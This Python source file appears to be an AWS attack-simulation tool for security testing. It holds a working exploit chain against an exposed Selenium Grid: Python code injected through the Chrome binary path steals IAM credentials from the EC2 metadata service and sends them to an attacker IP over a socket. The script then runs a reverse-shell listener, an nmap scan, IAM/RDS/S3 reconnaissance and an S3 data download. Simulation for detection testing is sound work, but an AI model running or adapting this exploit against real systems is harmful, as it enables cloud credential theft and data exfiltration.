import os
import sys
import subprocess
import json
import logging
import time
import socket
import threading
import argparse
import boto3
import urllib.request
import re
import selenium.common.exceptions
from queue import Queue
from botocore.exceptions import ClientError
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.remote.remote_connection import RemoteConnection

CREDS_QUEUE = Queue()


def get_boto3_client(service_name, default_region="us-east-1", **kwargs):
	region = os.environ.get("AWS_DEFAULT_REGION")
	if not region:
		region = os.environ.get("AWS_REGION")

	if not region:
		region = default_region
		log.warning(
			"No region specified via AWS_DEFAULT_REGION or AWS_REGION. "
			"Defaulting to us-east-1."
		)
	return boto3.client(service_name, region_name=region, **kwargs)


# Logging function
def setup_logger():
	log_formatter = logging.Formatter(
		"[%(asctime)s] %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
	)
	console_handler = logging.StreamHandler()
	console_handler.setFormatter(log_formatter)

	logger = logging.getLogger()
	logger.setLevel(logging.INFO)
	logger.handlers = [console_handler]

	boto3_logger = logging.getLogger("botocore")
	boto3_logger.setLevel(logging.WARNING)
	boto3_logger.addHandler(console_handler)
	return


def get_ssm_parameters():
	ssm_client = get_boto3_client("ssm")
	log.info("Fetching SSM Parameters")
	try:
		response = ssm_client.get_parameters(
			Names=[
				"/attack-sims/aws/selenium-grid-ip",
				"/attack-sims/aws/sensitive-bucket-name",
				"/attack-sims/aws/sensitive-bucket-key",
				"/attack-sims/aws/selenium-grid-region",
			],
		)
		if len(response["InvalidParameters"]) > 0:
			log.error(f"Invalid parameters: {response['InvalidParameters']}")
			return None
		parameters = {
			param["Name"].split("/")[-1]: param["Value"]
			for param in response["Parameters"]
		}
		return parameters
	except ClientError as e:
		log.error(f"Failed to fetch SSM parameters: {e}")
		return None
	except Exception as e:
		log.error(f"Unexpected error while fetching SSM parameters: {e}")
		return None


def run_nmap_scan(target_ip, target_ports):
	log.info(f"Running nmap port scan on target {target_ip}...")
	try:
		proc = subprocess.Popen(
			["sudo", "nmap", "-Pn", "-sU", "-p", target_ports, target_ip],
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
		)

		stdout, stderr = proc.communicate()
		return_code = proc.returncode
		if return_code != 0:
			log.error(f"nmap scan failed with return code {return_code}")
			log.error(f"nmap stderr: {stderr.decode()}")
			return None

		else:
			log.info("nmap scan completed successfully.")
			log.info(f"nmap stdout: {stdout.decode()}")
			return stdout.decode()
	except Exception as e:
		log.error(f"Unexpected error while running nmap scan: {e}")
		return None


# Start reverse shell listener (best effort - non-critical)
def start_reverse_shell_listener(port, timeout_seconds=10):
	log.info("Starting reverse shell listener (best effort)...")
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(("", port))
		s.listen(1)
		s.settimeout(timeout_seconds)

		log.info(f"Listening for incoming connections on port {port}...")
		conn, addr = s.accept()
		log.info(f"Connection established with {addr}")
		return conn, addr, s
	except socket.timeout:
		log.warning("No incoming connection within the timeout period (this is OK).")
		return None, None, None
	except OSError as e:
		log.warning(f"Failed to bind to port {port}: {e} (this is OK, continuing...)")
		return None, None, None
	except Exception as e:
		log.warning(f"Error while accepting connection: {e} (this is OK, continuing...)")
		return None, None, None


def start_listener_and_wait(port, ip):
	"""Best effort listener - doesn't fail if it doesn't work"""
	try:
		result = start_reverse_shell_listener(port)
		conn, addr, socket_obj = result
	except Exception as e:
		log.warning(f"Failed to start listener: {e} (continuing anyway)")
		CREDS_QUEUE.put(None)
		return

	try:
		if conn:
			try:
				log.info(f"Reverse shell connection established with {addr}.")
				stdout = conn.recv(2048).decode("utf-8")
				log.info(f"Received data from reverse shell: {stdout}")
				try:
					creds = json.loads(stdout)
					log.info(f"Credentials parsed: {creds}")
					CREDS_QUEUE.put(creds)
				except json.JSONDecodeError:
					log.warning(f"Failed to parse JSON from reverse shell: {stdout}")
					CREDS_QUEUE.put(None)
			except socket.timeout:
				log.warning("No data received within the timeout period.")
				CREDS_QUEUE.put(None)
			finally:
				log.info("Closing reverse shell connection...")
				conn.close()
		else:
			log.warning(f"Failed to establish reverse shell connection (continuing with SSM fallback)")
			CREDS_QUEUE.put(None)
	except Exception as e:
		log.warning(f"Error during listener operation: {e}")
		CREDS_QUEUE.put(None)
	finally:
		if socket_obj:
			log.info("Closing server socket...")
			socket_obj.close()


# Run Selenium exploit
def run_selenium_exploit(remote_url, ip, port):
	python_code = f"""
-cimport socket,urllib.request; 
try: 
	s=socket.socket(); s.connect('{ip}',{port}); 
except: 
	pass

import json

try:
    # Try IMDSv2 first, will work as long as `httpTokens` is set to `optional` or `required`
    req = urllib.request.Request('http://169.254.169.254/latest/api/token', method='PUT', headers={{'X-aws-ec2-metadata-token-ttl-seconds': '21600'}});
    token = urllib.request.urlopen(req).read().decode('utf-8');

    req = urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers={{'X-aws-ec2-metadata-token': token}});
    role = urllib.request.urlopen(req).read().decode('utf-8');

    req = urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, headers={{'X-aws-ec2-metadata-token': token}});
    creds = urllib.request.urlopen(req).read();

except Exception as e:
    print('IMDSv2 failed:', str(e));
    # Fall back to IMDSv1
    try:
        role = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read().decode('utf-8');
        creds = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role).read();
    except Exception as e:
        print('IMDSv1 failed:', str(e));
        creds = b'{{}}'.encode('utf-8');

# Try to send via socket (may fail, that's OK)
try:
    print('Attempting to send via socket to {ip}:{port}');
    s.send(creds);
    s.close();
    print('Socket send complete');
except Exception as e:
    print('Socket send failed (expected):', str(e));

# ALSO send to sidecar container via HTTP (bulletproof fallback)
try:
    print('Sending to sidecar at localhost:8888');
    req = urllib.request.Request(
        'http://localhost:8888/creds',
        data=creds,
        method='POST',
        headers={{'Content-Type': 'application/json'}}
    );
    resp = urllib.request.urlopen(req);
    print('Sidecar response:', resp.read().decode());
except Exception as e:
    print('Sidecar send failed:', str(e));
"""
	log.info("Running Selenium exploit...")
	chrome_options = ChromeOptions()
	chrome_options.binary_location = "/usr/bin/python3"
	chrome_options.add_argument(python_code)
	log.debug(f"Full python code: {python_code}")
	
	# Save the original timeout
	original_timeout = RemoteConnection._timeout
	
	try:
		log.info(f"Attempting to connect to Selenium Grid at {remote_url} (10 second timeout)...")
		# Set a 10-second timeout for the connection
		RemoteConnection._timeout = 10
		webdriver.Remote(command_executor=remote_url, options=chrome_options)
	except selenium.common.exceptions.WebDriverException as e:
		log.info("WebDriver connection failed as expected (exploit still executed)")
		pass
	except Exception as e:
		log.debug(f"Connection failed with: {type(e).__name__}: {e}")
		pass
	else:
		sys.exit(1)
	finally:
		# Restore the original timeout
		RemoteConnection._timeout = original_timeout


# Poll SSM for stolen credentials
def poll_ssm_for_credentials(ssm_client, timeout=30):
	"""Poll SSM Parameter Store for stolen credentials using USER's credentials"""
	log.info("Polling SSM Parameter Store for stolen credentials...")
	param_name = "/attack-simulation/stolen-credentials"
	start_time = time.time()
	
	while time.time() - start_time < timeout:
		try:
			response = ssm_client.get_parameter(
				Name=param_name,
				WithDecryption=True
			)
			creds_json = response['Parameter']['Value']
			creds = json.loads(creds_json)
			log.info("Successfully retrieved stolen credentials from SSM!")
			
			# Optional: clean up the parameter
			try:
				ssm_client.delete_parameter(Name=param_name)
				log.info("Cleaned up SSM parameter")
			except:
				pass  # If we can't delete, that's OK
				
			return creds
		except ssm_client.exceptions.ParameterNotFound:
			if time.time() - start_time < 5:
				log.info(f"Waiting for credentials to appear in SSM...")
			time.sleep(2)
		except Exception as e:
			log.error(f"Error polling SSM: {e}")
			time.sleep(2)
	
	log.error(f"Timeout: No credentials found in SSM after {timeout} seconds")
	return None


# Attempt to download object from S3
def download_s3_object(creds, bucket_name, object_key):
	s3_client = get_boto3_client("s3", default_region=creds["region"],
								 aws_access_key_id=creds["AccessKeyId"],
								 aws_secret_access_key=creds["SecretAccessKey"],
								 aws_session_token=creds["Token"])

	log.info(
		f"Attempting to download object 's3://{bucket_name}/{object_key}'...")
	try:
		s3_client.download_file(bucket_name, object_key, object_key)
		log.info(f"Object downloaded successfully to {object_key}.")
	except ClientError as e:
		log.error(f"Failed to download object: {e}")


def recon_aws(creds):
	log.info("Attempting to recon AWS...")
	s3_client = get_boto3_client("s3", default_region=creds["region"],
								 aws_access_key_id=creds["AccessKeyId"],
								 aws_secret_access_key=creds["SecretAccessKey"],
								 aws_session_token=creds["Token"])
	iam_client = get_boto3_client("iam", default_region=creds["region"],
								  aws_access_key_id=creds["AccessKeyId"],
								  aws_secret_access_key=creds[
									  "SecretAccessKey"],
								  aws_session_token=creds["Token"])
	rds_client = get_boto3_client("rds", default_region=creds["region"],
								  aws_access_key_id=creds["AccessKeyId"],
								  aws_secret_access_key=creds[
									  "SecretAccessKey"],
								  aws_session_token=creds["Token"])

	try:
		iam_client.list_roles()
		log.info("IAM roles listed successfully.")
	except ClientError as e:
		log.error(f"Failed to list IAM roles: {e}")
	try:
		iam_client.list_users()
		log.info("IAM users listed successfully.")
	except ClientError as e:
		log.error(f"Failed to list IAM users: {e}")
	try:
		rds_client.describe_db_instances()
		log.info("RDS Describe success")
	except ClientError as e:
		log.error(f"Failed to describe RDS Databases: {e}")
	try:
		s3_client.list_buckets()
		log.info("S3 Buckets listed successfully.")
	except ClientError as e:
		log.error(f"Failed to list S3 buckets: {e}")

	return


def parse_args():
	parser = argparse.ArgumentParser(description='AWS Attack Simulation Script')
	parser.add_argument('--run-nmap', action='store_true',
						help='Run nmap scan on target (disabled by default)')
	parser.add_argument('--port', type=int, default=4444,
						help='Port to use for reverse shell listener when enabled (default: 4444)')
	parser.add_argument('--enable-listener', action='store_true',
						help='Enable reverse shell listener (disabled by default for reliability)')
	return parser.parse_args()


def main():
	args = parse_args()
	reverse_shell_port = args.port
	target_ports = ("22,53,80,24444,980,981,982,983,984,985,986,987,988,999,"
					"500,501,502,503,504,505,904")
	
	# Get victim details
	victim_details = get_ssm_parameters()
	victim_region = victim_details.get("selenium-grid-region")
	if not victim_details:
		log.error("Failed to retrieve victim details.")
		return
	log.info("Victim details retrieved successfully.")

	# Run nmap scan only if --run-nmap flag is provided
	if args.run_nmap:
		try:
			log.info("Running nmap scan as requested...")
			run_nmap_scan(victim_details["selenium-grid-ip"], target_ports)
		except Exception as e:
			log.error(f"Failed to run nmap scan: {e}")
			# Continue execution even if nmap fails

	# Get public IP for reverse shell (even though connection likely won't work)
	try:
		public_ip = (
			urllib.request.urlopen("https://checkip.amazonaws.com")
			.read()
			.decode("utf8").strip()
		)
		log.info(f"Public IP: {public_ip}")
	except:
		public_ip = "1.2.3.4"  # Fallback IP
		log.warning(f"Failed to get public IP, using fallback: {public_ip}")

	# Start listener thread (best effort - non-critical)
	if args.enable_listener:
		log.info("Starting reverse shell listener thread as requested...")
		listener_thread = threading.Thread(
			target=start_listener_and_wait,
			args=(reverse_shell_port, public_ip),
			daemon=True,
		)
		listener_thread.start()
		log.info("Listener thread started.")
	else:
		log.info("Reverse shell listener disabled (default). Use --enable-listener to enable.")

	# Run exploit
	log.info(f"Running Selenium exploit...")
	run_selenium_exploit(
		f"http://{victim_details['selenium-grid-ip']}:24444/wd/hub",
		public_ip,
		reverse_shell_port
	)
	log.info("Exploit script initiated.")
	
	# Give listener a chance to receive data (but don't rely on it)
	if args.enable_listener:
		listener_thread.join(timeout=3)

	# Primary method: Poll SSM for credentials using USER's credentials
	ssm_client = get_boto3_client("ssm")
	creds = poll_ssm_for_credentials(ssm_client, timeout=30)
	
	# Fallback: Check if listener got credentials
	if not creds and args.enable_listener:
		try:
			listener_creds = CREDS_QUEUE.get(timeout=1)
			if listener_creds:
				log.info("Got credentials from reverse shell listener!")
				creds = listener_creds
		except:
			pass

	if creds:
		log.info("Credentials obtained successfully!")
		creds["region"] = victim_region
		
		# Perform AWS reconnaissance
		recon_aws(creds)

		# Sleep to simulate dwell time
		log.info("Starting 30-second pause...")
		time.sleep(30)
		log.info("30-second pause completed.")

		# Try to exfiltrate data
		log.info("Attempting to exfiltrate data...")
		download_s3_object(creds, victim_details["sensitive-bucket-name"],
						   victim_details["sensitive-bucket-key"])
	else:
		log.error("Failed to obtain credentials via any method.")
		return 1

	log.info("Attack simulation completed successfully.")
	return 0


if __name__ == "__main__":
	setup_logger()
	log = logging.getLogger()
	sys.exit(main())
